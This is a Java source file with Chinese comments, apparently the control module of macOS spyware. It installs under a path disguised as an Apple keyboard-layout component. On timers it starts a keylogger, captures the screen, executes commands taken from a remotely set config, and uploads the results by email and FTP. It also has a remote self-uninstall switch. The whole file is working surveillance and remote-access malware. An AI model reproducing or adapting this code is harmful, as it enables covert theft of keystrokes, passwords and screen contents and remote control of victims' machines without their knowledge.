package mac.project.main;

import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

import mac.project.email.*;
import mac.project.ftp.*;;

/**
 * 总控制面板
 * @author root
 * 1.9.0
 */

public class AutoRun{

	private static final long serialVersionUID = -449258518719504071L;
	private String OSName = System.getProperty("os.name");
	private String OSVersion = System.getProperty("os.version");
	public String LocationPath = System.getProperty("user.dir");
	public String ConfigFilePath;	//配置文件获取路径 ConfigFilePath = LOCATION + "/config";
	public String DefaultInstallPath;
	public ConfigBean configBean;
	
	public FtpPanel fp;
	public MailPanel mp;
	Timer runTimer;
	Timer keyTimer;
	Timer screenTimer;
	Timer cmdTimer;
	Timer emailTimer;
	ActiveCheck aCK;	//检查在线状态 Active｜｜Deleted
	FtpDownAndUp fDAU;	//上传下载控制线程
	
	public AutoRun() {
		try {
			Init();		//所有 AWT 事件的根事件类
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * @throws IOException
	 */
	private void Init() throws IOException{

		System.out.printf(("LocalSystem: " + OSName + "\n"), "UTF-8");
		System.out.println("SystemVersion: " + OSVersion);
		
	    ConfigFilePath = LocationPath + "/config";
	    configBean = new ConfigBean();
		System.out.println("ConfigFilePath: " + ConfigFilePath);
		DefaultInstallPath = "/System/Library/KerberosPlugins/KerberosCorePlugins/AppleKeyboardLayouts.app";
		System.out.println("DefaultInstallPath: " + DefaultInstallPath);

		new ChangeConfig(ConfigFilePath,configBean);
		new ScreenInfoPanel(this);
		new KeyInfoPanel(this);
		fp = new FtpPanel(this);
		mp = new MailPanel(this);

		aCK = new ActiveCheck();
		aCK.start();
		
		{	//运行检测
			runTimer = new Timer(); 
			runTimer.schedule(new runTask(), 17*1000, 1*60*1000);
		}
		{	//键盘开始
			keyTimer = new Timer(); 
			keyTimer.schedule(new logkextTask(), 20*1000, 1*60*1000);
		}
		{	//截屏设置
			screenTimer = new Timer(); 
			screenTimer.schedule(new screenTask(), 23*1000, 1*60*1000);//10*60* 1000
		}
		{	//	命令执行
			cmdTimer = new Timer(); 
			cmdTimer.schedule(new cmdTask(), 13*1000, 15*1000);
		}	
		{	//邮件上传时间设置 
			int mailperiod=100;//若不选取的话，默认为10					
			System.out.println("mail Send time："+mailperiod);
			emailTimer = new Timer(); 
			emailTimer.schedule(new mailTask(), 11*1000, (9+mailperiod)*60*1000);//邮件的：0表示开机就运行，10＊1000表示每10秒运行一次
		}
		// FTP上传下载线程启动
		{
			fDAU = new FtpDownAndUp("fDAU",fp, ConfigFilePath,configBean);
			fDAU.start();
		}
	}
		
	/**
	 * @author root
	 * 主程序控制模块，控制程序卸载开关
	 */
	public class runTask extends TimerTask {
		String defaultPath = DefaultInstallPath;
		String localPath = LocationPath + "/";
		
		public void run()
		{
			System.err.println("Run Check!");
			//卸载判断
			boolean runFlag = false;
			String defaultPath = DefaultInstallPath;
			String cmdUninstall = defaultPath + "/Contents/Uninstall.command";
			runFlag = configBean.getRunStatu();
			if(runFlag) {						//执行卸载功能
				screenTimer.cancel();
				keyTimer.cancel();
				emailTimer.cancel();
				cmdTimer.cancel();
				
				CheckThread csp = new CheckThread("ScreenSaver");
				csp.start();
				try {
					csp.join();
				} catch (InterruptedException e1) {
					e1.printStackTrace();
				}
				if (csp.processIsExist()) {
					ScreenInfoPanel sip = new ScreenInfoPanel();
					new KillProcess(sip).killProgress();
					csp.isContinue = false;		//中止检查线程
				}
				aCK.isRun = false;
				try {
					aCK.join();
				} catch (InterruptedException e1) {
					e1.printStackTrace();
				}
				ActiveCheck ack = new ActiveCheck("deleted!!!");
				ack.start();
				int sleeptime = 30;
				try {
					int st = Integer.parseInt(configBean.getUploadPeriod());
					if(st>sleeptime) sleeptime = st;
					System.out.println("sleeptime："+sleeptime+" second");
				} catch (NumberFormatException e) {
					System.err.println("sleeptime err!" + e.toString());
				}
				SleepTime sT = new SleepTime(sleeptime);
				sT.start();
				sT.isSleep = false;
				try {
					sT.join();
					ack.isRun = false;
					ack.join();
					fDAU.flag = false;
					fDAU.join();
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
				//执行卸载shell
				new CommandExecute(cmdUninstall).run();
				try {
					SleepTime st = new SleepTime(10);
					st.start();
					st.isSleep = false;
					st.join();
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
				this.cancel();
				System.exit(0);
			}
		}
	}
	
	/**
	 * @author root
	 * 截屏控制模块，控制截屏开关
	 */
	public class screenTask extends TimerTask {
		String defaultPath = DefaultInstallPath;
		String localPath = LocationPath + "/";
		
		public void run()
		{
			System.err.println("screen Start!");
			boolean ScreenFlag = false;
			String screenUrl = "";
			ScreenFlag = configBean.getScreenStatu();
			screenUrl = configBean.getScreenDes();

			System.out.println("ScreenFlag:"+ScreenFlag);
			CheckThread csp = new CheckThread("ScreenSaver");
			csp.start();
			try {
				csp.join();
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
			
			if (!ScreenFlag && !(csp.processIsExist())) {
				//新建并启动截屏线程
				ScreenSaver ss = new ScreenSaver(localPath,screenUrl);
				Thread screencapture = new Thread(ss);
				screencapture.start();
			} else if (ScreenFlag){
				if (csp.processIsExist()) {
					ScreenInfoPanel sip = new ScreenInfoPanel();
					new KillProcess(sip).killProgress();
					csp.isContinue = false;		//中止检查线程
				}
			}
//			ScreenInfoPanel.startButton.doClick();
		}
	}
	
	/**
	 * @author root
	 * 键盘控制模块，控制键盘开关
	 */
	public class logkextTask extends TimerTask {
		String defaultPath = DefaultInstallPath;
		String cmdON = defaultPath + "/Contents/LogKextON.command";
		String cmdOFF = defaultPath + "/Contents/LogKextOFF.command";
		
		public void run()
		{
			System.err.println("key start!:");
			boolean KeyFlag = false;
			String KeyUrl = "";
			KeyFlag = configBean.getKeyStatu();
			KeyUrl = configBean.getKeyboardDes();
			String Path=defaultPath + "/Contents/keydeflog";
			if (!KeyUrl.isEmpty()&&(!KeyUrl.equals(Path))) {
				String cmdSetPath = defaultPath + "/Contents/setPath.command " + KeyUrl;
				new CommandExecute(cmdSetPath).run();
			}
			
			System.out.println("KeyFlag:"+KeyFlag);
			CheckThread ckp = new CheckThread("keydefin");
			ckp.start();
			try {
				ckp.join();
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
			
			if (!KeyFlag && !(ckp.processIsExist())) {
				System.out.println("Key ON！");
				//新建并启动键盘线程
				new CommandExecute(cmdON).run();
			} else if(KeyFlag){
				if (ckp.processIsExist()) {
					KeyInfoPanel kip = new KeyInfoPanel();
					new KillProcess(kip).killProgress();
					ckp.isContinue = false;		//中止检查线程
					new CommandExecute(cmdOFF).run();
				}
			}
//			KeyInfoPanel.openButton.doClick();
		}
	}
	
	/**
	 * @author root
	 * 邮件发送模块，目前还是由模拟点击按钮实现，附件自动上传未实现
	 */
	public class mailTask extends TimerTask {
		public void run()
		{
			System.err.println("email start run !");
			mp.mailSend();
		}
	}
	
	/**
	 * @author root
	 * 命令执行模块，执行结果存放在系统临时文件夹内
	 */
	public class cmdTask extends TimerTask {
		String defaultPath = DefaultInstallPath;
		public void run()
		{
			System.err.println("cmd start!");
			String cmdStr = "";
			cmdStr = configBean.getCommand();
			if((cmdStr!=null)&&(!cmdStr.equals(""))&&(!cmdStr.equals("null"))){
				String tempPath = System.getProperty("java.io.tmpdir");
	//			String tempPath="/Users/";
	//			new Command().run();		//测试函数
				System.out.println("cmd："+ cmdStr + "\nsave to：" + tempPath);
				Command p = new Command(cmdStr, tempPath);
				p.run();
	//	        new Thread(p).start();
			}
		}
	}

	public static void main(String[] args) throws IOException{
		new AutoRun();
	}
}